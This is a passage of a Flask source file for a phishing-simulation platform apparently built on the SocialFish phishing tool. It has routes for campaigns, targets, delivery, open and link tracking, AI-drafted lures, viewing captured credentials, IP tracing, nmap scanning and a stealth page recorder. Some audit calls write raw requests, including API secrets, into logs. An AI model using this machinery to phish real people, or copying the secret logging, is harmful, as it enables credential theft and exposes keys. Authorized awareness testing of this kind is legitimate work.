        reporting=detail["reporting"],
        metrics=detail["metrics"],
        import_batches=detail["import_batches"],
        ai_drafts=detail["ai_drafts"],
        delivery_preview=detail["delivery_preview"],
        delivery_readiness=check_campaign_delivery_readiness(g.db, campaign_id),
        delivery_jobs=detail["delivery_jobs"],
        delivery_providers=detail["delivery_providers"],
        target_filters=detail["target_filters"],
        target_filter_options=detail["target_filter_options"],
        statuses=ADMIN_FORM_STATUSES,
        channels=("email", "sms", "voice"),
        target_csv_required_columns=TARGET_CSV_REQUIRED_COLUMNS,
        target_csv_optional_columns=TARGET_CSV_OPTIONAL_COLUMNS,
    )


@app.route("/simulations/campaigns/<int:campaign_id>/deliveries/preview", methods=['POST'])
@flask_login.login_required
def preview_simulation_delivery(campaign_id):
    try:
        payload = _delivery_payload()
        preview = build_delivery_preview(
            g.db,
            campaign_id,
            provider_ids=payload["provider_ids"],
            mode=payload["mode"],
        )
        record_delivery_audit(
            g.db,
            "delivery.preview",
            None,
            campaign_id=campaign_id,
            **_audit_context(
                channel=",".join(sorted(preview["providers"].keys())),
                metadata={
                    "mode": preview["mode"],
                    "total_targets": preview["total_targets"],
                    "total_attempts": preview["total_attempts"],
                    "provider_ids": {
                        channel: provider.get("id")
                        for channel, provider in preview["providers"].items()
                    },
                }
            ),
        )
        return jsonify({"status": "ok", "preview": preview})
    except (TypeError, ValueError) as e:
        return _json_error("delivery_preview_error", str(e), 400)


@app.route("/simulations/campaigns/<int:campaign_id>/deliveries/start", methods=['POST'])
@flask_login.login_required
def start_simulation_delivery(campaign_id):
    try:
        payload = _delivery_payload()
        readiness = check_campaign_delivery_readiness(
            g.db,
            campaign_id,
            provider_ids=payload["provider_ids"],
            mode=payload["mode"],
        )
        if not readiness["ready"]:
            messages = [check["action"] for check in readiness["failed_checks"]]
            message = "Campaign is not ready for delivery: {}".format(" ".join(messages))
            if request.is_json:
                return _json_error(
                    "delivery_readiness_failed",
                    message,
                    400,
                    readiness=readiness,
                )
            for action in messages:
                flash(action, "danger")
            return redirect("/simulations/campaigns/{}#delivery-readiness".format(campaign_id))
        created = create_delivery_job_from_campaign(
            g.db,
            campaign_id,
            provider_ids=payload["provider_ids"],
            mode=payload["mode"],
            requested_by=flask_login.current_user.get_id(),
            max_retries=payload["max_retries"],
        )
        status = run_delivery_job(g.db, created["job"]["id"])
        record_delivery_audit(
            g.db,
            "delivery.start",
            status["job"]["id"],
            campaign_id=campaign_id,
            **_audit_context(
                channel=",".join(sorted(status["job"].get("provider_snapshot", {}).keys())),
                metadata={
                    "mode": status["job"]["mode"],
                    "status": status["job"]["status"],
                    "total_attempts": status["job"]["total_attempts"],
                    "delivered_count": status["job"]["delivered_count"],
                    "failed_count": status["job"]["failed_count"],
                    "max_retries": payload["max_retries"],
                }
            ),
        )
        if request.is_json:
            return jsonify({"status": "ok", "delivery": status})
        flash("Delivery job #{} started in {} mode.".format(status["job"]["id"], status["job"]["mode"]), "success")
        return redirect("/simulations/deliveries/{}".format(status["job"]["id"]))
    except (TypeError, ValueError) as e:
        if request.is_json:
            return _json_error("delivery_start_error", str(e), 400)
        flash(str(e), "danger")
        return redirect("/simulations/campaigns/{}".format(campaign_id))


@app.route("/simulations/deliveries/<int:job_id>", methods=['GET'])
@flask_login.login_required
def simulation_delivery_status(job_id):
    try:
        status = get_delivery_job_status(g.db, job_id)
    except ValueError as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns")
    return render_template(
        'admin/simulation_delivery_status.html',
        delivery=status,
    )


@app.route("/api/simulations/deliveries/<int:job_id>", methods=['GET'])
@flask_login.login_required
def simulation_delivery_status_api(job_id):
    try:
        return jsonify({"status": "ok", "delivery": get_delivery_job_status(g.db, job_id)})
    except ValueError as e:
        return _json_error("delivery_status_error", str(e), 404)


@app.route("/simulations/track/open/<token>", methods=['GET'])
def simulation_open_tracking_pixel(token):
    try:
        record_tracking_token_event(g.db, token, token_type="open", metadata=_tracking_metadata("open_pixel"))
    except ValueError:
        pass
    return Response(
        TRACKING_PIXEL_GIF,
        mimetype="image/gif",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
        },
    )


@app.route("/simulations/track/link/<token>", methods=['GET'])
def simulation_link_tracking_redirect(token):
    try:
        result = record_tracking_token_event(g.db, token, token_type="link", metadata=_tracking_metadata("link_redirect"))
        destination = result["token"].get("destination_url") or "/"
    except ValueError:
        destination = "/"
    return redirect(destination)


@app.route("/simulations/track/attachment/<token>", methods=['GET', 'POST'])
def simulation_attachment_tracking_event(token):
    try:
        result = record_tracking_token_event(g.db, token, token_type="attachment", metadata=_tracking_metadata("attachment_event"))
        return jsonify({"status": "ok", "event": result["event"]})
    except ValueError as e:
        return _json_error("tracking_token_error", str(e), 404)


@app.route("/api/simulations/providers/<channel>/<provider_key>/webhook", methods=['POST'])
def simulation_provider_webhook(channel, provider_key):
    try:
        channel = _normalize_api_channel(channel)
        provider = get_delivery_provider_by_key(g.db, channel, provider_key)
        if not provider:
            return _json_error("provider_webhook_error", "Unknown simulation delivery provider.", 404)
        body = request.get_data() or b""
        if not _provider_webhook_signature_valid(provider, body):
            return _json_error("provider_webhook_signature_error", "Invalid provider webhook signature.", 401)
        payload = request.get_json(silent=True) or request.form.to_dict()
        result = record_provider_webhook_event(g.db, channel, provider_key, payload)
        return jsonify({
            "status": "ok",
            "event": result["event"],
            "tracking_token": result["tracking_token"],
            "provider": {
                "id": result["provider"]["id"],
                "channel": result["provider"]["channel"],
                "provider_key": result["provider"]["provider_key"],
                "provider_type": result["provider"]["provider_type"],
            },
        })
    except (TypeError, ValueError) as e:
        return _json_error("provider_webhook_error", str(e), 400)


@app.route("/simulations/campaigns/<int:campaign_id>", methods=['POST'])
@flask_login.login_required
def update_simulation_campaign(campaign_id):
    try:
        payload = _campaign_payload()
        existing = get_campaign_detail(g.db, campaign_id)["campaign"]
        _validate_campaign_status_transition(existing.get("status"), payload.get("status"))
        campaign = update_campaign(g.db, campaign_id, **payload)
        record_campaign_audit(
            g.db,
            "campaign.update",
            campaign["id"],
            **_audit_context(
                metadata={
                    "name": campaign["name"],
                    "status": campaign["status"],
                    "selected_channels": campaign["selected_channels"],
                    "authorized_scope_present": bool(campaign.get("authorized_scope")),
                    "authorization_statement_present": bool(campaign.get("authorization_statement")),
                }
            ),
        )
        flash("Campaign metadata updated.", "success")
        return redirect("/simulations/campaigns/{}".format(campaign["id"]))
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns/{}".format(campaign_id))


@app.route("/simulations/campaigns/<int:campaign_id>/archive", methods=['POST'])
@flask_login.login_required
def archive_simulation_campaign(campaign_id):
    try:
        campaign = archive_campaign(g.db, campaign_id)
        record_campaign_audit(
            g.db,
            "campaign.archive",
            campaign_id,
            **_audit_context(metadata={"name": campaign["name"], "status": campaign["status"]}),
        )
        flash("Campaign archived. Historical metrics were preserved.", "success")
    except ValueError as e:
        flash(str(e), "danger")
    return redirect("/simulations/campaigns")


@app.route("/simulations/targets/sample.csv", methods=['GET'])
@flask_login.login_required
def simulation_targets_sample_csv():
    output = StringIO()
    fieldnames = TARGET_CSV_REQUIRED_COLUMNS + TARGET_CSV_OPTIONAL_COLUMNS
    writer = csv.DictWriter(output, fieldnames=fieldnames, lineterminator="\n")
    writer.writeheader()
    writer.writerows(TARGET_CSV_SAMPLE_ROWS)
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={
            "Content-Disposition": "attachment; filename=simulation-target-import-sample.csv",
            "Cache-Control": "no-store",
        },
    )


@app.route("/simulations/campaigns/<int:campaign_id>/targets", methods=['POST'])
@flask_login.login_required
def create_simulation_target(campaign_id):
    try:
        target = create_target(g.db, campaign_id, **_target_payload())
        record_target_audit(
            g.db,
            "target.create",
            target["id"],
            campaign_id=campaign_id,
            **_audit_context(
                channel=target.get("channel"),
                metadata={
                    "source": target.get("source"),
                    "department": target.get("department"),
                    "active": target.get("active"),
                },
            ),
        )
        flash("Target {} added to the campaign.".format(target["display_name"] or target["name"]), "success")
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
    return redirect("/simulations/campaigns/{}".format(campaign_id))


@app.route("/simulations/campaigns/<int:campaign_id>/targets/upload", methods=['POST'])
@flask_login.login_required
def upload_simulation_targets(campaign_id):
    upload = request.files.get("targets_csv") or request.files.get("csv_file")
    if not upload or not upload.filename:
        flash("Choose a CSV file before importing targets.", "danger")
        return redirect("/simulations/campaigns/{}".format(campaign_id))

    try:
        result = import_targets_csv(
            g.db,
            campaign_id,
            upload.read(),
            original_filename=upload.filename,
        )
        imported_count = len(result["targets"])
        record_target_audit(
            g.db,
            "target.csv_import",
            "batch:{}".format(result["batch"]["id"]),
            campaign_id=campaign_id,
            **_audit_context(
                metadata={
                    "original_filename": result["batch"].get("original_filename"),
                    "total_rows": result["batch"].get("total_rows"),
                    "valid_rows": result["batch"].get("valid_rows"),
                    "invalid_rows": result["batch"].get("invalid_rows"),
                    "imported_rows": imported_count,
                    "error_count": len(result["errors"]),
                }
            ),
        )
        if result["errors"]:
            flash(
                "Imported {} target(s) with {} validation error(s).".format(imported_count, len(result["errors"])),
                "warning",
            )
            for error in result["errors"][:5]:
                flash("CSV row {}: {}".format(error["row"], error["message"]), "danger")
        else:
            flash("Imported {} target(s) from CSV.".format(imported_count), "success")
    except (TypeError, ValueError, UnicodeDecodeError) as e:
        flash(str(e), "danger")
    return redirect("/simulations/campaigns/{}".format(campaign_id))


@app.route("/simulations/targets/<int:target_id>", methods=['POST'])
@flask_login.login_required
def update_simulation_target(target_id):
    try:
        target = update_target(g.db, target_id, **_target_payload())
        record_target_audit(
            g.db,
            "target.update",
            target["id"],
            campaign_id=target["campaign_id"],
            **_audit_context(
                channel=target.get("channel"),
                metadata={"source": target.get("source"), "active": target.get("active")},
            ),
        )
        flash("Target {} updated.".format(target["display_name"] or target["name"]), "success")
        return redirect("/simulations/campaigns/{}".format(target["campaign_id"]))
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns")


@app.route("/simulations/targets/<int:target_id>/archive", methods=['POST'])
@flask_login.login_required
def archive_simulation_target(target_id):
    try:
        target = archive_target(g.db, target_id)
        record_target_audit(
            g.db,
            "target.archive",
            target["id"],
            campaign_id=target["campaign_id"],
            **_audit_context(
                channel=target.get("channel"),
                metadata={"source": target.get("source"), "active": target.get("active")},
            ),
        )
        flash("Target archived. Historical events were preserved.", "success")
        return redirect("/simulations/campaigns/{}".format(target["campaign_id"]))
    except ValueError as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns")


@app.route("/api/simulations/metrics", methods=['GET'])
@flask_login.login_required
def simulation_metrics_api():
    try:
        campaign_id = _optional_int(request.args.get("campaign_id"))
        return jsonify({
            'status': 'ok',
            'metrics': get_campaign_metrics(g.db, campaign_id, _simulation_metric_filters()),
        })
    except (TypeError, ValueError) as e:
        return _json_error("simulation_metrics_error", str(e), 400)


@app.route("/api/simulations/campaigns/<int:campaign_id>/metrics", methods=['GET'])
@flask_login.login_required
def simulation_campaign_metrics_api(campaign_id):
    try:
        return jsonify({
            "status": "ok",
            "campaign_id": campaign_id,
            "metrics": get_campaign_metrics(g.db, campaign_id, _simulation_metric_filters()),
        })
    except (TypeError, ValueError) as e:
        return _json_error("simulation_campaign_metrics_error", str(e), 400)


@app.route("/api/simulations/campaigns/<int:campaign_id>/targets/metrics", methods=['GET'])
@flask_login.login_required
def simulation_campaign_target_metrics_api(campaign_id):
    try:
        filters = _simulation_metric_filters()
        return jsonify({
            "status": "ok",
            "campaign_id": campaign_id,
            "targets": get_target_metrics(g.db, campaign_id, filters),
            "filters": get_campaign_metrics(g.db, campaign_id, filters)["filters"],
        })
    except (TypeError, ValueError) as e:
        return _json_error("simulation_target_metrics_error", str(e), 400)


@app.route("/simulations/campaigns/<int:campaign_id>/targets/metrics.csv", methods=['GET'])
@flask_login.login_required
def simulation_campaign_target_metrics_csv(campaign_id):
    try:
        detail = get_campaign_detail(g.db, campaign_id)
        filters = _simulation_metric_filters()
        targets = get_target_metrics(g.db, campaign_id, filters)
        record_export_audit(
            g.db,
            "export.metrics",
            "target-metrics-csv",
            campaign_id=campaign_id,
            **_audit_context(
                metadata={
                    "format": "csv",
                    "target_count": len(targets),
                    "filters": get_campaign_metrics(g.db, campaign_id, filters)["filters"],
                }
            ),
        )
        return _target_metrics_csv_response(detail["campaign"], targets, get_campaign_metrics(g.db, campaign_id, filters)["filters"])
    except (TypeError, ValueError) as e:
        return _json_error("simulation_target_metrics_export_error", str(e), 400)


@app.route("/simulations/campaigns/<int:campaign_id>/events.json", methods=['GET'])
@flask_login.login_required
def simulation_campaign_events_json(campaign_id):
    try:
        detail = get_campaign_detail(g.db, campaign_id)
        events = [_safe_event_export(event) for event in detail["reporting"]["events"]]
        record_export_audit(
            g.db,
            "export.events",
            "campaign-events-json",
            campaign_id=campaign_id,
            **_audit_context(
                metadata={
                    "format": "json",
                    "event_count": len(events),
                    "redaction": {
                        "provider_secrets": "omitted",
                        "sensitive_metadata_fields": "redacted",
                    },
                }
            ),
        )
        payload = {
            "status": "ok",
            "campaign": {
                "id": detail["campaign"]["id"],
                "name": detail["campaign"]["name"],
                "status": detail["campaign"]["status"],
            },
            "events": events,
            "redaction": {
                "provider_secrets": "omitted",
                "sensitive_metadata_fields": "redacted",
            },
        }
        return Response(
            json.dumps(payload, indent=2, sort_keys=True),
            mimetype="application/json",
            headers={
                "Content-Disposition": "attachment; filename=simulation-campaign-{}-events.json".format(campaign_id),
                "Cache-Control": "no-store",
            },
        )
    except (TypeError, ValueError) as e:
        return _json_error("simulation_events_export_error", str(e), 400)


@app.route("/simulations/campaigns/<int:campaign_id>/report", methods=['GET'])
@flask_login.login_required
def simulation_campaign_print_report(campaign_id):
    try:
        detail = get_campaign_detail(g.db, campaign_id)
        filters = _simulation_metric_filters()
        metrics = get_campaign_metrics(g.db, campaign_id, filters)
        record_export_audit(
            g.db,
            "report.view",
            "campaign-report",
            campaign_id=campaign_id,
            **_audit_context(metadata={"filters": metrics["filters"]}),
        )
        return render_template(
            'admin/simulation_campaign_report.html',
            campaign=detail["campaign"],
            metrics=metrics,
            reporting=detail["reporting"],
            filters=metrics["filters"],
        )
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns")


@app.route("/api/simulations/metrics/overview", methods=['GET'])
@flask_login.login_required
def simulation_metrics_overview_api():
    try:
        return jsonify({
            "status": "ok",
            "metrics": get_campaign_metrics(
                g.db,
                filters=_simulation_metric_filters(active_campaigns_only=True),
            ),
        })
    except (TypeError, ValueError) as e:
        return _json_error("simulation_metrics_overview_error", str(e), 400)


@app.route("/api/simulations/events", methods=['POST'])
@flask_login.login_required
def simulation_events_api():
    data = _request_data()
    try:
        channel = _normalize_api_channel(data.get('channel')) if data.get('channel') else None
        delivery_status = _normalize_delivery_status_filter(data.get('delivery_status'))
        event = record_simulation_event(
            g.db,
            _optional_int(data.get('campaign_id')),
            data.get('event_type'),
            target_id=_optional_int(data.get('target_id')),
            channel=channel,
            delivery_status=delivery_status,
            metadata=data.get('metadata') if isinstance(data.get('metadata'), dict) else None,
        )
        return jsonify({'status': 'ok', 'event': event})
    except (TypeError, ValueError) as e:
        return _json_error("simulation_event_record_error", str(e), 400)


@app.route("/simulations/ai-builder", methods=['GET'])
@flask_login.login_required
def ai_scenario_builder():
    return render_template(
        'admin/ai_builder.html',
        campaigns=list_campaigns(g.db),
        providers=list_ai_provider_settings(g.db),
        channels=("email", "sms", "voice"),
        difficulties=("introductory", "standard", "advanced"),
        tones=("professional", "calm", "plainspoken", "supportive"),
    )


@app.route("/api/simulations/ai/generate", methods=['POST'])
@flask_login.login_required
def ai_generate_api():
    try:
        payload = _ai_generation_payload()
        if not payload["provider_id"]:
            return _json_error("missing_provider_configuration", "Choose an enabled AI provider before generating drafts.")
        response = generate_ai_scenario(g.db, payload["provider_id"], payload["request"])
        generation = ai_generation_response_payload(response)
        audit_id = record_generation_audit(
            g.db,
            "generation.create",
            "provider:{}".format(payload["provider_id"]),
            campaign_id=payload["request"].campaign_context.get("campaign_id"),
            **_audit_context(
                metadata={
                    "provider_id": payload["provider_id"],
                    "channels": generation["channels"],
                    "risk_flags": generation["risk_flags"],
                    "safety_notes": generation["safety_notes"],
                }
            ),
        )
        generation["administrative_audit_event_id"] = audit_id
        return jsonify({
            "status": "ok",
            "generation": generation,
        })
    except (AIDisabledProviderError, AIProviderConfigurationError, AIProviderTypeError, ValueError) as e:
        return _json_error("missing_provider_configuration", str(e), 400)
    except AIContentPolicyError as e:
        return _json_error("blocked_content", str(e), 400, risk_flags=e.risk_flags)
    except AIGenerationError as e:
        return _json_error("provider_failure", str(e), 502)
    except Exception as e:
        logger.exception("AI generation provider failure")
        return _json_error("provider_failure", str(e), 502)


@app.route("/api/simulations/ai/save-draft", methods=['POST'])
@flask_login.login_required
def ai_save_draft_api():
    data = _request_data()
    try:
        draft = save_ai_campaign_draft(
            g.db,
            _optional_int(data.get("campaign_id")),
            data.get("draft") if isinstance(data.get("draft"), dict) else data,
            data.get("channels") or data.get("selected_channels") or _request_channels(),
            provider=data.get("provider") if isinstance(data.get("provider"), dict) else {},
            risk_flags=data.get("risk_flags") or [],
            safety_notes=data.get("safety_notes") or [],
            metadata=data.get("metadata") if isinstance(data.get("metadata"), dict) else {},
            audit_id=_optional_int(data.get("audit_id")),
            status=data.get("status") or "approved",
        )
        record_generation_audit(
            g.db,
            "generation.draft_save",
            draft["id"],
            campaign_id=draft["campaign_id"],
            **_audit_context(
                metadata={
                    "provider_id": draft.get("provider_id"),
                    "provider_type": draft.get("provider_type"),
                    "channels": draft.get("channels"),
                    "status": draft.get("status"),
                    "risk_flags": draft.get("risk_flags"),
                    "safety_notes": draft.get("safety_notes"),
                }
            ),
        )
        return jsonify({"status": "ok", "draft": draft})
    except (TypeError, ValueError) as e:
        return _json_error("missing_provider_configuration", str(e), 400)


@app.route("/ai-settings", methods=['GET'])
@flask_login.login_required
def ai_settings():
    providers = list_ai_provider_settings(g.db)
    delivery_providers = list_delivery_provider_settings(g.db)
    return render_template(
        'admin/ai_settings.html',
        providers=providers,
        delivery_providers=delivery_providers,
    )


@app.route("/api/ai-settings", methods=['POST'])
@flask_login.login_required
def ai_settings_api():
    data = _request_data()
    try:
        provider = update_ai_provider_settings(
            g.db,
            _optional_int(data.get('provider_id') or data.get('id')),
            name=data.get('name'),
            provider_type=data.get('provider_type'),
            model_name=data.get('model_name'),
            base_url=data.get('base_url'),
            enabled=_form_bool(data.get('enabled')),
            secret=data.get('secret') or data.get('api_key'),
            description=data.get('description'),
        )
        record_ai_provider_audit(
            g.db,
            "ai_provider.configure",
            provider["id"],
            **_audit_context(
                metadata={
                    "name": provider.get("name"),
                    "provider_type": provider.get("provider_type"),
                    "model_name": provider.get("model_name"),
                    "enabled": provider.get("enabled"),
                    "secret_configured": provider.get("secret_configured"),
                    "request": data,
                }
            ),
        )
        return jsonify({'status': 'ok', 'provider': provider})
    except (TypeError, ValueError) as e:
        return _json_error("ai_provider_settings_error", str(e), 400)


@app.route("/api/delivery-settings", methods=['POST'])
@flask_login.login_required
def delivery_settings_api():
    data = _request_data()
    try:
        provider = update_delivery_provider_settings(
            g.db,
            _optional_int(data.get('provider_id') or data.get('id')),
            provider_name=data.get('provider_name') or data.get('name'),
            enabled=_form_bool(data.get('enabled')),
            settings=_delivery_settings_payload(data),
            secret=data.get('secret') or data.get('api_key'),
        )
        if request.is_json:
            return jsonify({'status': 'ok', 'provider': provider})
        flash("Delivery provider {} updated.".format(provider["provider_name"]), "success")
        return redirect("/ai-settings#delivery-providers")
    except (TypeError, ValueError) as e:
        if request.is_json:
            return _json_error("delivery_provider_settings_error", str(e), 400)
        flash(str(e), "danger")
        return redirect("/ai-settings#delivery-providers")


@app.route("/integrations/directory", methods=['GET'])
@flask_login.login_required
def directory_integrations():
    providers = list_directory_provider_settings(g.db)
    campaigns = list_campaigns(g.db)
    sync_jobs = list_directory_sync_jobs(g.db, limit=10)
    return render_template(
        'admin/directory_integrations.html',
        providers=providers,
        campaigns=campaigns,
        sync_jobs=sync_jobs,
    )


@app.route("/api/integrations/directory/providers", methods=['POST'])
@flask_login.login_required
def directory_provider_settings_api():
    payload = _directory_provider_payload()
    provider_id = payload.pop("provider_id")
    try:
        if provider_id is None:
            provider = create_directory_provider_settings(g.db, **payload)
            action_type = "directory_provider.create"
        else:
            provider = update_directory_provider_settings(g.db, provider_id, **payload)
            action_type = "directory_provider.update"
        record_directory_sync_audit(
            g.db,
            action_type,
            "provider:{}".format(provider["id"]),
            **_audit_context(
                metadata={
                    "provider_id": provider["id"],
                    "provider_type": provider.get("provider_type"),
                    "enabled": provider.get("enabled"),
                    "consent_status": provider.get("consent_status"),
                    "selected_groups": provider.get("selected_groups"),
                    "secret_configured": provider.get("secret_configured"),
                    "request": payload,
                }
            ),
        )
        return jsonify({"status": "ok", "provider": provider})
    except (TypeError, ValueError) as e:
        return _json_error("directory_provider_settings", str(e), 400)


@app.route("/api/integrations/directory/providers/<int:provider_id>/test", methods=['POST'])
@flask_login.login_required
def directory_provider_test_api(provider_id):
    provider = get_directory_provider_settings(g.db, provider_id)
    if not provider:
        return _json_error("directory_provider_not_found", "Unknown directory provider config id: {}".format(provider_id), 404)
    try:
        groups = list_directory_groups(g.db, provider_id)
        record_directory_sync_audit(
            g.db,
            "directory_provider.test",
            "provider:{}".format(provider_id),
            **_audit_context(
                metadata={
                    "provider_id": provider_id,
                    "provider_type": provider.get("provider_type"),
                    "group_count": len(groups),
                    "mock": provider.get("provider_type") == "mock_entra",
                }
            ),
        )
        return jsonify({
            "status": "ok",
            "provider": provider,
            "test": {
                "message": "Directory provider is ready to list groups.",
                "group_count": len(groups),
                "mock": provider.get("provider_type") == "mock_entra",
            },
        })
    except DirectoryConnectorError as e:
        return _directory_connector_error_response(e)


@app.route("/api/integrations/directory/providers/<int:provider_id>/groups", methods=['GET'])
@flask_login.login_required
def directory_provider_groups_api(provider_id):
    provider = get_directory_provider_settings(g.db, provider_id)
    if not provider:
        return _json_error("directory_provider_not_found", "Unknown directory provider config id: {}".format(provider_id), 404)
    try:
        groups = [_directory_group_response(group) for group in list_directory_groups(g.db, provider_id)]
        return jsonify({"status": "ok", "provider": provider, "groups": groups})
    except DirectoryConnectorError as e:
        return _directory_connector_error_response(e)


@app.route("/api/integrations/directory/providers/<int:provider_id>/preview", methods=['POST'])
@flask_login.login_required
def directory_provider_preview_api(provider_id):
    if not get_directory_provider_settings(g.db, provider_id):
        return _json_error("directory_provider_not_found", "Unknown directory provider config id: {}".format(provider_id), 404)
    payload = _directory_sync_request_payload()
    try:
        result = preview_directory_sync(
            g.db,
            provider_id,
            group_ids=payload["group_ids"],
            requested_by=_directory_requested_by(),
        )
        record_directory_sync_audit(
            g.db,
            "directory_sync.preview",
            result["job"]["id"],
            **_audit_context(
                metadata={
                    "provider_id": provider_id,
                    "selected_groups": result["job"].get("selected_groups"),
                    "staged_count": result["job"].get("staged_count"),
                    "invalid_count": result["job"].get("invalid_count"),
                }
            ),
        )
        return jsonify({"status": "ok", "sync_job": result})
    except DirectoryConnectorError as e:
        return _directory_connector_error_response(e)
    except ValueError as e:
        return _json_error("directory_sync_preview", str(e), 400)


@app.route("/api/integrations/directory/providers/<int:provider_id>/sync", methods=['POST'])
@flask_login.login_required
def directory_provider_sync_api(provider_id):
    if not get_directory_provider_settings(g.db, provider_id):
        return _json_error("directory_provider_not_found", "Unknown directory provider config id: {}".format(provider_id), 404)
    payload = _directory_sync_request_payload()
    try:
        result = sync_directory_users(
            g.db,
            provider_id,
            group_ids=payload["group_ids"],
            campaign_id=payload["campaign_id"],
            requested_by=_directory_requested_by(),
        )
        record_directory_sync_audit(
            g.db,
            "directory_sync.sync",
            result["job"]["id"],
            campaign_id=payload["campaign_id"],
            **_audit_context(
                metadata={
                    "provider_id": provider_id,
                    "requested_campaign_id": payload["campaign_id"],
                    "selected_groups": result["job"].get("selected_groups"),
                    "imported_count": result["job"].get("imported_count"),
                    "skipped_count": result["job"].get("skipped_count"),
                    "duplicate_count": result["job"].get("duplicate_count"),
                    "invalid_count": result["job"].get("invalid_count"),
                }
            ),
        )
        return jsonify({"status": "ok", "sync_job": result})
    except DirectoryConnectorError as e:
        return _directory_connector_error_response(e)
    except ValueError as e:
        return _json_error("directory_sync_import", str(e), 400)


@app.route("/integrations/directory/sync-jobs/<int:job_id>", methods=['GET'])
@flask_login.login_required
def directory_sync_job_results(job_id):
    result = get_directory_sync_job_results(g.db, job_id)
    if not result:
        return _json_error("directory_sync_job_not_found", "Unknown directory sync job id: {}".format(job_id), 404)
    return render_template("admin/directory_sync_job.html", sync_job=result)

# pagina para envio de emails
@app.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        row = cur.execute("SELECT email, smtp, port FROM sfmail where id = 1").fetchone()
        if row:
            email, smtp, port = row[0], row[1], row[2]
        else:
            email, smtp, port = '', '', ''
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
        cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
        cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log
@app.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        if not id.isdigit():
            return "Invalid ID"
        sql = "SELECT jdoc FROM creds WHERE id = ?"
        cur = g.db
        credInfo = cur.execute(sql, (id,)).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@app.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except Exception as e:
        print(f'[-] Trace error: {str(e)}')
        return "Network Error", 500

# rota para scan do nmap
@app.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@app.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        new_token = genToken()
        cur.execute("UPDATE socialfish SET token = ? WHERE id = 1", (new_token,))
        g.db.commit()
        ensure_socialfish_row(cur)
        token = sf_get(cur, 'token', '')
        genQRCode(token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@app.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@app.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@app.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@app.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#================================================================================================================================
# RECORDER & TEMPLATES ROUTES (v3.0+)

# Recorder - Start/Stop recording session
@app.route("/recorder/start", methods=['POST'])
@flask_login.login_required
def recorder_start():
    """Start a new recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    headless = data.get('headless', 'true').lower() == 'true'
    stealth = data.get('stealth', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
